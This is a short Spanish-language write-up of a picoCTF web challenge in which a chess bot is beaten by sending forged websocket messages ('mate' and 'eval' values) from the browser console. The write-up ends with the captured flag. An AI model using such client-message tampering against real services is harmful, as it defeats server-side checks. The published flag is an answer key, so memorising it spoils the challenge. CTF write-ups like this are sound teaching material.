## Descripción 
Can you win in a convincing manner against this chess bot? He won't go easy on you!You can find the challenge [here](http://verbal-sleep.picoctf.net:51452/).

Hint:
1. Try understanding the code and how the websocket client is interacting with the server
## Solución 1

Ingresando a la página, nos muestra un juego de ajedrez al cual tenemos que ganarle para que nos de la bandera, entonces miramos el código fuente y nos fijamos que va mostrando los mensajes del cliente en el servidor, modificamos los "movimientos" con la consola del inspector, haciendo que vayan cambiando las condiciones de la partida, vamos probando con cada player y le ponemos un valor sumamente negativo para que sea imposible que gane, dando pie a que nos brinde la bandera porque va perdiendo la máquina.

```
Consola

uBOL: Generic cosmetic filtering stopped because no more DOM changes
> sendMessage("mate 10")
< undefined
> sendMessage("eval 10")
< undefined
> sendMessage("eval 100000")
< undefined
> sendMessage("mate 100000000")
< undefined
> sendMessage("mate -100000000")
< undefined
> sendMessage("eval -100000000")
< undefined

flag: picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_b820bcc2}
```
